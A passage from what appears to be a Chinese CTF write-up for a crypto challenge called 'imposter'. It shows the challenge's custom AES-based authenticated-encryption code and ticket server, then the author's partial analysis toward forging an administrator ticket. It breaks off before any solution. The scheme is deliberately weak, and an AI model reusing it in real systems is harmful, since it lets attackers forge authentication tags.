class="keyword">x</span>)+long_to_bytes(<span class="keyword">y</span>))</span><br></pre></td></tr></table></figure><h3 id="imposter"><a href="#imposter" class="headerlink" title="imposter"></a>imposter</h3><p>Toy_AE.py</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">import</span> os</span><br><span class="line"><span class="symbol">from</span> Crypto.Cipher <span class="meta">import</span> AES</span><br><span class="line"><span class="symbol">from</span> Crypto.Util.<span class="keyword">strxor </span><span class="meta">import</span> <span class="keyword">strxor</span></span><br><span class="line"><span class="keyword">from </span>Crypto.Util.number <span class="meta">import</span> long_to_bytes, <span class="keyword">bytes_to_long</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">class </span>Toy_AE():</span><br><span class="line">    def __init__(<span class="keyword">self):</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.block_size </span>= <span class="number">16</span></span><br><span class="line">        <span class="keyword">self.n_size </span>= <span class="keyword">self.block_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.block_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.init_cipher()</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   def init_cipher(<span class="keyword">self):</span></span><br><span class="line"><span class="keyword"> </span>       key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self.cipher </span>= AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    def pad(<span class="keyword">self, </span>m, <span class="keyword">block_size):</span></span><br><span class="line"><span class="keyword"> </span>       return m <span class="meta">if</span> len(m) == <span class="keyword">block_size </span><span class="meta">else</span> (m + <span class="keyword">b'\x80' </span>+ (<span class="keyword">b'\x00' </span>* (<span class="keyword">block_size </span>- <span class="number">1</span> - len(m))))</span><br><span class="line"></span><br><span class="line">    def GF2_mul(<span class="keyword">self, </span>a, <span class="keyword">b, </span>n_size):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        for <span class="keyword">bit </span>in <span class="keyword">bin(a)[2:]:</span></span><br><span class="line"><span class="keyword"> </span>           s = s &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="meta">if</span> <span class="keyword">bit </span>== <span class="string">'1'</span>:</span><br><span class="line">                s ^= <span class="keyword">b</span></span><br><span class="line"><span class="keyword"> </span>       upper = <span class="keyword">bytes_to_long(long_to_bytes(s)[:-n_size])</span></span><br><span class="line"><span class="keyword"> </span>       lower = <span class="keyword">bytes_to_long(long_to_bytes(s)[-n_size:])</span></span><br><span class="line"><span class="keyword"> </span>       return upper ^ lower</span><br><span class="line"></span><br><span class="line">    def encrypt(<span class="keyword">self, </span>msg):</span><br><span class="line">        return <span class="keyword">self.A_EF(msg)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   def decrypt(<span class="keyword">self, </span>ct, _te):</span><br><span class="line">        msg, te = <span class="keyword">self.A_DF(ct)</span></span><br><span class="line"><span class="keyword"> </span>       return msg <span class="meta">if</span> _te == te <span class="meta">else</span> None</span><br><span class="line"></span><br><span class="line">    def A_EF(<span class="keyword">self, </span>msg):</span><br><span class="line">        <span class="keyword">self.Sigma </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.L </span>= <span class="keyword">self.cipher.encrypt(b'ConvenienceFixed')</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'DeltaConvenience'</span></span><br><span class="line"><span class="keyword"> </span>       m = len(msg) // <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       m += <span class="number">1</span> <span class="meta">if</span> (len(msg) % <span class="keyword">self.n_size) </span><span class="meta">else</span> <span class="number">0</span></span><br><span class="line">        M_list = [msg[i * <span class="keyword">self.n_size </span>: (i + <span class="number">1</span>) * <span class="keyword">self.n_size] </span>for i in range(m)]</span><br><span class="line">        C_list = []</span><br><span class="line">        for i in range(<span class="number">0</span>, (m-<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">            <span class="built_in">C1</span>, <span class="built_in">C2</span> = <span class="keyword">self.feistel_enc_2r(M_list[2*i], </span>M_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line">            C_list.append(<span class="built_in">C1</span>)</span><br><span class="line">            C_list.append(<span class="built_in">C2</span>)</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(M_list[2*i </span>+<span class="number">1</span>], <span class="keyword">self.Sigma)</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= long_to_bytes(<span class="keyword">self.GF2_mul(2, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">if</span> m &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            Z = <span class="keyword">self.cipher.encrypt(strxor(self.L, </span>M_list[-<span class="number">2</span>]))</span><br><span class="line">            Cm  =  <span class="keyword">strxor(Z[:len(M_list[-1])], </span>M_list[-<span class="number">1</span>])</span><br><span class="line">            Cm_1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(strxor(self.L, </span><span class="keyword">self.delta), </span><span class="keyword">self.pad(Cm, </span><span class="keyword">self.block_size))), </span>M_list[-<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">strxor(Z, </span><span class="keyword">self.pad(Cm, </span><span class="keyword">self.block_size)))</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= <span class="keyword">strxor(self.L, </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>           C_list.append(Cm_1)</span><br><span class="line">            C_list.append(Cm)</span><br><span class="line"><span class="symbol">        else:</span></span><br><span class="line">            Cm = <span class="keyword">strxor(self.cipher.encrypt(self.L)[:len(M_list[-1])], </span>M_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">self.pad(M_list[-1], </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>           C_list.append(Cm)</span><br><span class="line">        <span class="meta">if</span> len(M_list[-<span class="number">1</span>]) == <span class="keyword">self.n_size:</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">multer </span>= <span class="keyword">strxor(long_to_bytes(self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size)), </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">else</span>:</span><br><span class="line">            <span class="keyword">multer </span>= long_to_bytes(<span class="keyword">self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       TE = <span class="keyword">self.cipher.encrypt(strxor(self.Sigma, </span><span class="keyword">multer))</span></span><br><span class="line"><span class="keyword"> </span>       return <span class="keyword">b''.join(C_list), </span>TE</span><br><span class="line"></span><br><span class="line">    def A_DF(<span class="keyword">self, </span>ct):</span><br><span class="line">        <span class="keyword">self.Sigma </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.L </span>= <span class="keyword">self.cipher.encrypt(b'ConvenienceFixed')</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'DeltaConvenience'</span></span><br><span class="line"><span class="keyword"> </span>       m = len(ct) // <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       m += <span class="number">1</span> <span class="meta">if</span> (len(ct) % <span class="keyword">self.n_size) </span><span class="meta">else</span> <span class="number">0</span></span><br><span class="line">        C_list = [ct[i * <span class="keyword">self.n_size </span>: (i + <span class="number">1</span>) * <span class="keyword">self.n_size] </span>for i in range(m)]</span><br><span class="line">        M_list = []</span><br><span class="line">        for i in range(<span class="number">0</span>, (m-<span class="number">1</span>) // <span class="number">2</span>):</span><br><span class="line">            M1, M2 = <span class="keyword">self.feistel_dec_2r(C_list[2*i], </span>C_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(M2 </span>,<span class="keyword">self.Sigma)</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= long_to_bytes(<span class="keyword">self.GF2_mul(2, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(M1)</span><br><span class="line">            M_list.append(M2)</span><br><span class="line">        <span class="meta">if</span> m &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            Mm_1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(strxor(self.L, </span><span class="keyword">self.delta), </span><span class="keyword">self.pad(C_list[-1], </span><span class="keyword">self.block_size))), </span>C_list[-<span class="number">2</span>])</span><br><span class="line">            Z = <span class="keyword">self.cipher.encrypt(strxor(self.L, </span>Mm_1))</span><br><span class="line">            Mm = <span class="keyword">strxor(Z[:len(C_list[-1])], </span>C_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">strxor(Z, </span><span class="keyword">self.pad(C_list[-1], </span><span class="keyword">self.block_size)))</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= <span class="keyword">strxor(self.L, </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(Mm_1)</span><br><span class="line">            M_list.append(Mm)</span><br><span class="line"><span class="symbol">        else:</span></span><br><span class="line">            Mm = <span class="keyword">strxor(self.cipher.encrypt(self.L)[:len(C_list[-1])], </span>C_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">self.pad(Mm, </span><span class="keyword">self.block_size))</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(Mm)</span><br><span class="line">        <span class="meta">if</span> len(C_list[-<span class="number">1</span>]) == <span class="keyword">self.n_size:</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">multer </span>= <span class="keyword">strxor(long_to_bytes(self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size)), </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">else</span>:</span><br><span class="line">            <span class="keyword">multer </span>= long_to_bytes(<span class="keyword">self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       TE = <span class="keyword">self.cipher.encrypt(strxor(self.Sigma, </span><span class="keyword">multer))</span></span><br><span class="line"><span class="keyword"> </span>       return <span class="keyword">b''.join(M_list), </span>TE</span><br><span class="line"></span><br><span class="line">    def feistel_enc_2r(<span class="keyword">self, </span>M1, M2):</span><br><span class="line">        <span class="built_in">C1</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span>M2)</span><br><span class="line">        <span class="built_in">C2</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span>M1)</span><br><span class="line">        return <span class="built_in">C1</span>, <span class="built_in">C2</span></span><br><span class="line"></span><br><span class="line">    def feistel_dec_2r(<span class="keyword">self, </span><span class="built_in">C1</span>, <span class="built_in">C2</span>):</span><br><span class="line">        M1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span><span class="built_in">C2</span>)</span><br><span class="line">        M2 = <span class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span><span class="built_in">C1</span>)</span><br><span class="line">        return M1, M2</span><br></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Toy_AE <span class="keyword">import</span> Toy_AE</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">    proof = <span class="string">b''</span>.join([random.choice(string.ascii_letters + string.digits).encode() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">    digest = sha256(proof).hexdigest().encode()</span><br><span class="line">    print(<span class="string">"sha256(XXXX+%s) == %s"</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">    print(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">    x = input().encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x + proof[<span class="number">4</span>:]).hexdigest().encode() != digest <span class="keyword">else</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span><span class="params">(uid, uname, token, cmd, appendix)</span>:</span></span><br><span class="line">    r = <span class="string">b''</span></span><br><span class="line">    r += <span class="string">b'Uid=%d\xff'</span> % uid</span><br><span class="line">    r += <span class="string">b'UserName=%s\xff'</span> % uname</span><br><span class="line">    r += <span class="string">b'T=%s\xff'</span> % token</span><br><span class="line">    r += <span class="string">b'Cmd=%s\xff'</span> % cmd</span><br><span class="line">    r += appendix</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span><span class="params">(r)</span>:</span></span><br><span class="line">    data = r.split(<span class="string">b"\xff"</span>)</span><br><span class="line">    uid, uname, token, cmd, appendix = int(data[<span class="number">0</span>][<span class="number">4</span>:]), data[<span class="number">1</span>][<span class="number">9</span>:], data[<span class="number">2</span>][<span class="number">2</span>:], data[<span class="number">3</span>][<span class="number">4</span>:], data[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> (uid, uname, token, cmd, appendix)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    uid = int(input(<span class="string">"Set up your user id:"</span>)[:<span class="number">5</span>])</span><br><span class="line">    uname = input(<span class="string">"Your username:"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> uname == <span class="string">b"Administrator"</span>:</span><br><span class="line">        print(<span class="string">"Sorry, preserved username."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    token = sha256(uname).hexdigest()[:max(<span class="number">8</span>, uid % <span class="number">16</span>)].encode(<span class="string">"ascii"</span>)</span><br><span class="line">    cmd = input(<span class="string">"Your command:"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">b"Give_Me_Flag"</span>:</span><br><span class="line">        print(<span class="string">"Not allowed!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    appendix = input(<span class="string">"Any Appendix?"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    msg = pack(uid, uname, token, cmd, appendix)</span><br><span class="line">    ct, te = ae.encrypt(msg)</span><br><span class="line">    print(<span class="string">"Your ticket:%s"</span> % ct.hex())</span><br><span class="line">    print(<span class="string">"With my Auth:%s"</span> % te.hex())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ct = bytes.fromhex(input(<span class="string">"Ticket:"</span>))</span><br><span class="line">    te = bytes.fromhex(input(<span class="string">"Auth:"</span>))</span><br><span class="line">    msg = ae.decrypt(ct, te)</span><br><span class="line">    <span class="keyword">assert</span> msg</span><br><span class="line">    uid, uname, token, cmd, appendix = unpack(msg)</span><br><span class="line">    <span class="keyword">if</span> uname == <span class="string">b"Administrator"</span> <span class="keyword">and</span> cmd == <span class="string">b"Give_Me_Flag"</span>:</span><br><span class="line">        print(FLAG)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Nothing happend."</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Menu:"</span>)</span><br><span class="line">    print(<span class="string">"[1] Apply Ticket"</span>)</span><br><span class="line">    print(<span class="string">"[2] Check Ticket"</span>)</span><br><span class="line">    print(<span class="string">"[3] Exit"</span>)</span><br><span class="line">    op = int(input(<span class="string">"Your option:"</span>))</span><br><span class="line">    <span class="keyword">assert</span> op <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        apply_ticket()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        check_ticket()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Bye!"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    ae = Toy_AE()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            menu()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>可恶，果然是这样吗。。不只代码长，甚至附件都有俩。害，慢慢啃咯。。。先不管这个加密的具体是啥，来看看功能是啥叭。程序有俩功能，提供ticket，和检查ticket，获取flag的点在检查ticket，</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def decrypt(self, <span class="keyword">ct</span>, _te):</span><br><span class="line">msg, <span class="keyword">te</span> = self.A_DF(<span class="keyword">ct</span>)</span><br><span class="line"><span class="keyword">return</span> msg <span class="keyword">if</span> _te == <span class="keyword">te</span> <span class="keyword">else</span> None</span><br><span class="line"></span><br><span class="line">msg = ae.decrypt(<span class="keyword">ct</span>, <span class="keyword">te</span>)</span><br><span class="line"><span class="keyword">assert</span> msg</span><br><span class="line">uid, uname, <span class="keyword">token</span>, cmd, appendix = unpack(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uname == b<span class="string">"Administrator"</span> and cmd == b<span class="string">"Give_Me_Flag"</span>:</span><br><span class="line"><span class="keyword">print</span>(FLAG)</span><br></pre></td></tr></table></figure><p>要求你的这个ticket代表的信息是，用户名是Administrator，要执行的命令是Give_Me_Flag，并且还要提供这个ticket的签名Auth来保证他的合法性。</p><p>再来看看这个提供ticket有啥，</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def apply_ticket():</span><br><span class="line">    uid = int(<span class="keyword">input</span>(<span class="string">"Set up your user id:"</span>)[:5])</span><br><span class="line">    uname = <span class="keyword">input</span>(<span class="string">"Your username:"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    <span class="keyword">if</span> uname == b<span class="string">"Administrator"</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"Sorry, preserved username."</span>)</span><br><span class="line">        #<span class="built_in">return</span></span><br><span class="line">    <span class="keyword">token</span> = sha256(uname).hexdigest()[:<span class="built_in">max</span>(8, uid % 16)].<span class="keyword">encode</span>(<span class="string">"ascii"</span>)</span><br><span class="line">    cmd = <span class="keyword">input</span>(<span class="string">"Your command:"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    <span class="keyword">if</span> cmd == b<span class="string">"Give_Me_Flag"</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"Not allowed!"</span>)</span><br><span class="line">        #<span class="built_in">return</span></span><br><span class="line">    appendix = <span class="keyword">input</span>(<span class="string">"Any Appendix?"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    msg = pack(uid, uname, <span class="keyword">token</span>, cmd, appendix)</span><br></pre></td></tr></table></figure><p>他要求你提供，uid，用户名，cmd，和额外的可选择的信息。其中，用户名不能等于Administrator，cmd不能等于Give_Me_Flag。（不然这题直接就没了。）然后他会生成一个你的用户名的sha256的摘要，至于存多少长读进你的message呢，由你的uid来决定。</p><p><code>token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(&quot;ascii&quot;)</code></p><p>然后一些限制是，除了uid最大为5位数字之外，其余输入最多只能16个字符，并且每个字符的ascii都得在0-128之间（由decode(‘ascii’)限制）。（不然你要是输入\xff，这题也直接就没了）</p><p>所以题目意思很明确，你要伪造密文，并且还要能够构造对应的签名来通过合法性验证。让他解密信息后用户名为Administrator，cmd为Give_Me_Flag。然后由于对输入做的诸多限制，（甚至一次连接只能交互4次，除去一次来获取flag，只能交互三次，下一次连接就生成新的Toy_AE对象，生成新的key了）导致漏洞点大概率不会出现在这个task文件中，，那就要找这个Toy_AE算法的洞了。（啊，好长，不想看）</p><p>一点点啃叭，先大致随便看看，然后我们有目的性的先来看看生成Auth的过程。（单独拎出来会清晰些）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.Sigma = b<span class="string">'\x00'</span> * <span class="keyword">self</span>.n_size</span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(M_list[<span class="number">2</span>*i +<span class="number">1</span>], <span class="keyword">self</span>.Sigma)</span><br><span class="line"><span class="keyword">if</span> 组数为偶数：</span><br><span class="line">Z = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.L, M_list[-<span class="number">2</span>]))</span><br><span class="line">Cm  =  strxor(Z[<span class="symbol">:len</span>(M_list[-<span class="number">1</span>])], M_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(<span class="keyword">self</span>.Sigma, strxor(Z, <span class="keyword">self</span>.pad(Cm, <span class="keyword">self</span>.block_size)))</span><br><span class="line"><span class="symbol">else:</span></span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(<span class="keyword">self</span>.Sigma, <span class="keyword">self</span>.pad(M_list[-<span class="number">1</span>], <span class="keyword">self</span>.n_size))</span><br><span class="line">TE = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.Sigma, multer))</span><br><span class="line">TE = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.Sigma, multer))</span><br></pre></td></tr></table></figure><p>可以看到，如果组数为偶数，就会多生成一个Z，而且生成的密文方式也会比较麻烦，那么我们就先利用那个附加信息来控制组数，尽量避免这个麻烦的东西。</p><p>这样子的话Sigma第2块、第4块明文、填充后的第5块明文的异或，然后和multer</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> len(M_list[-<span class="number">1</span>]) == <span class="built_in">self</span>.n_size:</span><br><span class="line">multer = strxor(long_to_bytes(<span class="built_in">self</span>.GF2_mul(<span class="number">3</span>, bytes_to_long(<span class="built_in">self</span>.L), <span class="built_in">self</span>.n_size)), <span class="built_in">self</span>.delta)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">multer = long_to_bytes(<span class="built_in">self</span>.GF2_mul(<span class="number">3</span>, bytes_to_long(<span class="built_in">self</span>.L), <span 